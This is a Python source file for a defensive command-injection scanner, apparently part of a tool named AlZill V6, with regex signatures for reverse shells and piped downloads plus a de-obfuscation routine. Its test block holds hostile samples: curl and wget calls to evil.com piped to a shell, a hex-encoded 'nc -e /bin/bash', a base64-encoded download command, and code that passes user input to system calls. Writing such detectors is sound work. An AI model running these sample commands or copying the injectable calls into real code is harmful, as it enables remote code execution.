#!/usr/bin/env python3
"""
Bash & Command Injection Scanner - AlZill V6 Module
Advanced detection for Shell exploits, Obfuscated Payloads, and RCE
Features: De-obfuscation, PHP/Python bridge detection, Hidden payload discovery
"""

import re
import requests
import urllib3
import base64
import binascii
from termcolor import cprint
from urllib.parse import unquote, quote
from typing import List, Dict, Optional

# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


class BashScanner:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.findings = []

        # ============================================================
        # بصمات الحقن المتقدمة (V6 Signatures)
        # ============================================================
        self.injection_signatures = [
            # 1. التنفيذ المباشر والتحميل (Piping to Shell)
            (r'(curl|wget|fetch|python|perl|ruby).*?\s*\|\s*(bash|sh|zsh|ash|php|python)',
             'Remote Code Execution (RCE)', 'CRITICAL', 'Downloading and piping directly to a shell interpreter'),

            # 2. كسر الأوامر (Command Chaining)
            (r'[;&|`$]\s*(whoami|id|uname|hostname|netstat|ifconfig|ip|cat\s+/etc/|ls\s+/)',
             'Command Break-out / OS Discovery', 'CRITICAL', 'Attempting to chain commands using shell delimiters'),

            # 3. اتصالات الـ Reverse Shell
            (r'(bash\s+-i\s*>\s*&\s*/dev/tcp/|nc\s+(-e|--exec)\s+/bin/|python.*?-c.*?socket|perl\s+-e.*?Socket)',
             'Reverse Shell Payload', 'CRITICAL', 'Classic reverse shell payload detected'),

            # 4. الأوامر المشفرة (Obfuscation)
            (r'(base64\s+(-d|--decode)|printf\s+[\'"]\\x[0-9a-fA-F]+|echo\s+.*?\|\s*xxd)',
             'Obfuscated Command Execution', 'HIGH', 'Encoded payload discovered (Base64/Hex/Octal)'),

            # 5. التلاعب بالمتغيرات (Environment Variable Injection)
            (r'(export\s+\w+=|LD_PRELOAD=|PYTHONPATH=|PERL5LIB=|PATH\s*=)',
             'Environment Manipulation', 'MEDIUM', 'Potential hijacking of execution environment'),

            # 6. الرفع المشبوه للملفات
            (r'(curl|wget).*?\.(sh|py|pl|php|exe|bin|elf|so|pyc|jar|war)',
             'Suspicious Script Download', 'HIGH', 'Downloading executable or script from external source'),
             
            # 7. تجاوز الفلترة (Bypass Techniques)
            (r'(\$\{.*?\}.*?|\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4})',
             'Advanced Evasion Technique', 'HIGH', 'Using shell expansion or hex/unicode encoding to hide commands'),
            
            # 8. printf بناء أوامر خبيثة
            (r'printf\s+[\'"].*?[\'"]\s*\|\s*(bash|sh|zsh|ash)',
             'Hidden Command Builder (printf)', 'CRITICAL', 'Using printf to build and execute malicious commands'),
            
            # 9. Char بناء أوامر خبيثة
            (r'(chr\([0-9]+\)|char\([0-9]+\)|\$\[\[.*?\]\]).*?(bash|sh|system|exec)',
             'Character Assembly Attack', 'HIGH', 'Building commands character by character to evade detection'),
            
            # 10. XOR encoded commands
            (r'(xor|decrypt|decode).*?\.(sh|bash|py)',
             'XOR Encoded Payload', 'HIGH', 'XOR encoded malicious script detected'),
            
            # 11. Process substitution
            (r'<(\(|\(|\{)',
             'Process Substitution', 'MEDIUM', 'Using process substitution which can lead to code execution'),
        ]

        # ============================================================
        # دوال برمجية تستدعي أوامر نظام بشكل غير آمن (PHP, Python, Ruby, Perl)
        # ============================================================
        self.unsafe_bridge_functions = [
            # PHP
            (r'\bsystem\s*\((.*?)\)', 'PHP System()', 'PHP'),
            (r'\bshell_exec\s*\((.*?)\)', 'PHP Shell_exec()', 'PHP'),
            (r'\bexec\s*\((.*?)\)', 'PHP Exec()', 'PHP'),
            (r'\bpassthru\s*\((.*?)\)', 'PHP Passthru()', 'PHP'),
            (r'\bpopen\s*\((.*?)\)', 'PHP Popen()', 'PHP'),
            (r'\bproc_open\s*\((.*?)\)', 'PHP Proc_open()', 'PHP'),
            (r'\bpcntl_exec\s*\((.*?)\)', 'PHP Pcntl_exec()', 'PHP'),
            (r'\b`(.*?)`', 'PHP Backticks', 'PHP'),
            
            # Python
            (r'\bos\.system\s*\((.*?)\)', 'Python os.system()', 'Python'),
            (r'\bos\.popen\s*\((.*?)\)', 'Python os.popen()', 'Python'),
            (r'\bsubprocess\.(Popen|run|call|check_output|check_call)\s*\((.*?)\)', 'Python Subprocess', 'Python'),
            (r'\beval\s*\((.*?)\)', 'Python eval()', 'Python'),
            (r'\bexec\s*\((.*?)\)', 'Python exec()', 'Python'),
            (r'\b__import__\s*\(\s*[\'"]os[\'"]\s*\)', 'Python Import OS', 'Python'),
            
            # Ruby
            (r'\b`(.*?)`', 'Ruby Backticks', 'Ruby'),
            (r'\b%x\{(.*?)\}', 'Ruby %x{}', 'Ruby'),
            (r'\bsystem\s*\((.*?)\)', 'Ruby system()', 'Ruby'),
            (r'\bexec\s*\((.*?)\)', 'Ruby exec()', 'Ruby'),
            (r'\beval\s*\((.*?)\)', 'Ruby eval()', 'Ruby'),
            
            # Perl
            (r'\bsystem\s*\((.*?)\)', 'Perl system()', 'Perl'),
            (r'\bexec\s*\((.*?)\)', 'Perl exec()', 'Perl'),
            (r'\b`(.*?)`', 'Perl Backticks', 'Perl'),
            (r'\beval\s*\((.*?)\)', 'Perl eval()', 'Perl'),
        ]
        
        # ============================================================
        # أنماط إضافية للكشف عن الأوامر المخفية
        # ============================================================
        self.hidden_command_patterns = [
            # PHP short tags
            (r'<\?=\s*`(.*?)`', 'PHP Short Tag Command'),
            (r'<\?php\s*`(.*?)`', 'PHP Backtick Command'),
            
            # Python one-liners
            (r'python\s+-c\s+[\'"](.*?)[\'"]', 'Python One-liner'),
            (r'python\s+-c\s+[\'"]import\s+os;', 'Python OS Import'),
            
            # Perl one-liners
            (r'perl\s+-e\s+[\'"](.*?)[\'"]', 'Perl One-liner'),
            
            # Ruby one-liners
            (r'ruby\s+-e\s+[\'"](.*?)[\'"]', 'Ruby One-liner'),
            
            # Command substitution in strings
            (r'\$\(.*?\)', 'Command Substitution'),
            (r'`.*?`', 'Backtick Substitution'),
        ]

    # ============================================================
    # DE-OBFUSCATION ENGINE (فك تشفير الأوامر)
    # ============================================================
    
    def _deobfuscate(self, content: str) -> str:
        """
        فك تشفير الأوامر المخفية
        يدعم: Hex, Base64, URL Encoding, Char Assembly, Printf
        """
        deobfuscated = content
        
        # 1. فك ترميز URL
        try:
            deobfuscated = unquote(deobfuscated)
        except:
            pass
        
        # 2. فك ترميز Hex (\x65 -> e, \x6e\x63 -> nc)
        try:
            deobfuscated = re.sub(r'\\x([0-9a-fA-F]{2})', 
                                  lambda m: chr(int(m.group(1), 16)), deobfuscated)
            deobfuscated = re.sub(r'%([0-9a-fA-F]{2})', 
                                  lambda m: chr(int(m.group(1), 16)), deobfuscated)
        except:
            pass
        
        # 3. فك ترميز Octal (\143 -> c)
        try:
            deobfuscated = re.sub(r'\\([0-7]{3})', 
                                  lambda m: chr(int(m.group(1), 8)), deobfuscated)
        except:
            pass
        
        # 4. فك ترميز Unicode (\u0065 -> e)
        try:
            deobfuscated = re.sub(r'\\u([0-9a-fA-F]{4})', 
                                  lambda m: chr(int(m.group(1), 16)), deobfuscated)
        except:
            pass
        
        # 5. فك ترميز Base64 (للعبارات المشفرة كاملة)
        try:
            # البحث عن نصوص تبدو كـ Base64
            base64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', deobfuscated)
            for b64_str in base64_patterns:
                try:
                    decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                    if len(decoded) > 5 and any(cmd in decoded.lower() for cmd in ['bash', 'sh', 'curl', 'wget', 'nc']):
                        deobfuscated += f"\n# DECODED_BASE64: {decoded}"
                except:
                    pass
        except:
            pass
        
        # 6. فك ترميز printf char assembly
        try:
            # printf '%s' '\x6e\x63'
            printf_pattern = r'printf\s+[\'"].*?[\'"]\s*(?:>>?|\||>)\s*(\S+)'
            matches = re.findall(printf_pattern, deobfuscated)
            for match in matches:
                deobfuscated += f"\n# PRINTF_OUTPUT: {match}"
        except:
            pass
        
        # 7. إزالة التعليقات
        deobfuscated = re.sub(r'#.*?$', '', deobfuscated, flags=re.MULTILINE)
        deobfuscated = re.sub(r'//.*?$', '', deobfuscated, flags=re.MULTILINE)
        deobfuscated = re.sub(r'/\*.*?\*/', '', deobfuscated, flags=re.DOTALL)
        
        # 8. توحيد المسافات
        deobfuscated = re.sub(r'\s+', ' ', deobfuscated)
        
        return deobfuscated
    
    def _expand_command_substitutions(self, content: str) -> str:
        """
        توسيع عمليات استبدال الأوامر
        $(command) و `command`
        """
        expanded = content
        
        # استبدال $(command) -> command
        expanded = re.sub(r'\$\(([^)]+)\)', r'\1', expanded)
        
        # استبدال `command` -> command
        expanded = re.sub(r'`([^`]+)`', r'\1', expanded)
        
        return expanded
    
    # ============================================================
    # SCANNING FUNCTIONS
    # ============================================================
    
    def scan(self, content: str, source: str = "inline", verbose: bool = False) -> bool:
        """الوظيفة الرئيسية للمسح"""
        self.verbose = verbose
        current_findings = []
        
        cprint("\n" + "="*60, INFO)
        cprint("[BASH SCANNER] AlZill V6 - Advanced Command Injection Detection", HIGHLIGHT, attrs=['bold'])
        cprint("="*60, INFO)
        cprint(f"[*] Target: {source}", INFO)
        cprint("[*] Techniques: De-obfuscation | PHP/Python Bridge | Hidden Commands", "yellow")
        cprint("[*] Decoding: Hex | Base64 | URL | Octal | Unicode | Char Assembly", "yellow")
        
        # 1. التطبيع الأساسي
        normalized = self._deobfuscate(content)
        
        # 2. توسيع استبدالات الأوامر
        normalized = self._expand_command_substitutions(normalized)
        
        # 3. فحص سطر بسطر
        lines = normalized.splitlines()
        
        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line:
                continue
            
            original_line = content.splitlines()[line_num - 1].strip() if line_num <= len(content.splitlines()) else line
            
            # ============================================================
            # فحص بصمات الحقن
            # ============================================================
            for pattern, name, severity, desc in self.injection_signatures:
                if re.search(pattern, line, re.IGNORECASE):
                    current_findings.append({
                        'type': name,
                        'line': line_num,
                        'severity': severity,
                        'description': desc,
                        'evidence': original_line[:80].strip(),
                        'matched_pattern': pattern
                    })
                    if self.verbose:
                        cprint(f"    [!] Found: {name} at line {line_num}", "red")
            
            # ============================================================
            # فحص الدوال الجسرية (PHP, Python, Ruby, Perl)
            # ============================================================
            for pattern, name, language in self.unsafe_bridge_functions:
                match = re.search(pattern, line, re.IGNORECASE)
                if match:
                    # التحقق إذا كانت الدالة تستخدم مدخلات من المستخدم
                    user_input_pattern = r'\b(request|get|post|params|input|env|cmd|url|arg|argv|_GET|_POST|_REQUEST|_COOKIE|_SERVER)\b'
                    argument = match.group(1) if match.groups() else ""
                    
                    if re.search(user_input_pattern, argument, re.IGNORECASE) or re.search(user_input_pattern, line, re.IGNORECASE):
                        current_findings.append({
                            'type': 'Insecure OS Bridge',
                            'line': line_num,
                            'severity': 'CRITICAL',
                            'description': f'{name} ({language}) used with user-controlled input',
                            'evidence': original_line[:80].strip(),
                            'language': language,
                            'function': name
                        })
                        if self.verbose:
                            cprint(f"    [!] Found: {name} with user input at line {line_num}", "red")
                    else:
                        # حتى لو بدون مدخلات مباشرة، قد تكون خطيرة
                        current_findings.append({
                            'type': 'OS Command Bridge',
                            'line': line_num,
                            'severity': 'HIGH',
                            'description': f'{name} ({language}) potential command execution',
                            'evidence': original_line[:80].strip(),
                            'language': language,
                            'function': name
                        })
            
            # ============================================================
            # فحص الأوامر المخفية
            # ============================================================
            for pattern, name in self.hidden_command_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    current_findings.append({
                        'type': 'Hidden Command',
                        'line': line_num,
                        'severity': 'HIGH',
                        'description': f'{name} detected',
                        'evidence': original_line[:80].strip(),
                        'hidden_type': name
                    })
            
            # ============================================================
            # فحص متقدم: بناء الأوامر باستخدام char/ord
            # ============================================================
            char_assembly_pattern = r'(?:chr\([0-9]+\)|char\([0-9]+\)|\$\[\[[0-9]+\]\])(?:\s*\.\s*(?:chr\([0-9]+\)|char\([0-9]+\)|\$\[\[[0-9]+\]\]))*'
            if re.search(char_assembly_pattern, line, re.IGNORECASE):
                # محاولة فك بناء الحروف
                chars = re.findall(r'chr\(([0-9]+)\)|char\(([0-9]+)\)|\$\[\[([0-9]+)\]\]', line, re.IGNORECASE)
                if chars:
                    decoded = ''.join(chr(int(c[0] or c[1] or c[2])) for c in chars if any(c))
                    if decoded:
                        current_findings.append({
                            'type': 'Character Assembly Attack',
                            'line': line_num,
                            'severity': 'HIGH',
                            'description': f'Building command: "{decoded[:50]}"',
                            'evidence': original_line[:80].strip(),
                            'decoded_command': decoded[:100]
                        })
        
        # إزالة التكرارات
        unique_findings = []
        seen = set()
        for f in current_findings:
            key = (f['type'], f['line'])
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)
        
        self.findings.extend(unique_findings)
        self._display_results(unique_findings, source)
        return len(unique_findings) > 0
    
    def _display_results(self, findings: List[Dict], source: str):
        """عرض النتائج بشكل منظم"""
        if not findings:
            cprint(f"\n[✓] No command injection threats detected in {source}", SUCCESS)
            cprint("="*60 + "\n", INFO)
            return
        
        # حساب الإحصائيات
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for f in findings:
            severity_count[f['severity']] += 1
        
        cprint("\n" + "="*60, ERROR)
        cprint("⚠️  COMMAND INJECTION VULNERABILITIES DETECTED", ERROR, attrs=['bold'])
        cprint("="*60, ERROR)
        cprint(f"📊 CRITICAL: {severity_count['CRITICAL']} | HIGH: {severity_count['HIGH']} | MEDIUM: {severity_count['MEDIUM']} | TOTAL: {len(findings)}", "yellow")
        cprint(f"📍 Source: {source}", INFO)
        
        for i, f in enumerate(findings, 1):
            color = "red" if f['severity'] == 'CRITICAL' else "light_red" if f['severity'] == 'HIGH' else "yellow"
            cprint(f"\n  [{i}] [{f['severity']}] {f['type']}", color, attrs=['bold'])
            cprint(f"      Line: {f['line']}", INFO)
            cprint(f"      Description: {f['description']}", "white")
            cprint(f"      Evidence: {f['evidence']}", "cyan")
            
            if f.get('language'):
                cprint(f"      Language: {f['language']}", INFO)
            if f.get('function'):
                cprint(f"      Function: {f['function']}", INFO)
            if f.get('decoded_command'):
                cprint(f"      Decoded: {f['decoded_command']}", SUCCESS)
        
        cprint("\n" + "="*60, ERROR)
        cprint("[!] RECOMMENDATION: Never use user input in system commands!", WARNING)
        cprint("[!] Use parameterized queries or input validation!", WARNING)
        cprint("="*60 + "\n", ERROR)
    
    def generate_report(self, filename: str = "bash_scan_report.json") -> Dict:
        """توليد تقرير JSON"""
        import json
        from datetime import datetime
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'total_findings': len(self.findings),
            'severity_summary': {
                'CRITICAL': len([f for f in self.findings if f['severity'] == 'CRITICAL']),
                'HIGH': len([f for f in self.findings if f['severity'] == 'HIGH']),
                'MEDIUM': len([f for f in self.findings if f['severity'] == 'MEDIUM']),
                'LOW': len([f for f in self.findings if f['severity'] == 'LOW'])
            },
            'findings': self.findings
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            cprint(f"[+] Report saved to: {filename}", SUCCESS)
        except Exception as e:
            cprint(f"[!] Failed to save report: {e}", WARNING)
        
        return report


# ============================================================
# التوافق مع المحرك الرئيسي AlZill
# ============================================================

def scan_bash_code(content: str, source: str = "inline", verbose: bool = False) -> bool:
    """مسح محتوى مباشر"""
    scanner = BashScanner(verbose=verbose)
    return scanner.scan(content, source=source, verbose=verbose)


def scan_bash_file(filepath: str, verbose: bool = False) -> bool:
    """مسح ملف Bash"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        scanner = BashScanner(verbose=verbose)
        return scanner.scan(content, source=filepath, verbose=verbose)
    except Exception as e:
        cprint(f"[BASH SCANNER] Error reading {filepath}: {e}", ERROR)
        return False


def scan(url: str, verbose: bool = False) -> bool:
    """مسح عبر الرابط المباشر"""
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AlZill/V6'}
        response = requests.get(url, timeout=10, verify=False, headers=headers)
        return scan_bash_code(response.text, source=url, verbose=verbose)
    except Exception as e:
        if verbose:
            cprint(f"[BASH SCANNER ERROR] {url}: {e}", ERROR)
        return False


if __name__ == "__main__":
    # كود اختبار يحتوي على تمويه متقدم
    test_code = r'''
    # Normal comment - هذا تعليق عادي
    
    # 1. Command injection مباشر
    system("curl http://evil.com/x.sh | bash");
    
    # 2. PHP مع مدخلات المستخدم
    $cmd = $_GET['cmd'];
    exec($cmd);
    
    # 3. Hex encoded command (nc -e /bin/bash)
    printf("\x6e\x63\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68");
    
    # 4. Base64 encoded payload
    echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5zaHw=" | base64 -d | sh
    
    # 5. Python subprocess with user input
    import subprocess
    user_input = request.GET.get('cmd')
    subprocess.call(user_input, shell=True)
    
    # 6. Character assembly attack
    $cmd = chr(119) . chr(104) . chr(111) . chr(97) . chr(109) . chr(105);
    system($cmd);
    
    # 7. Backticks in PHP
    `wget http://evil.com/shell.php`
    
    # 8. Ruby system call
    system(params[:command])
    '''
    
    scan_bash_code(test_code, verbose=True)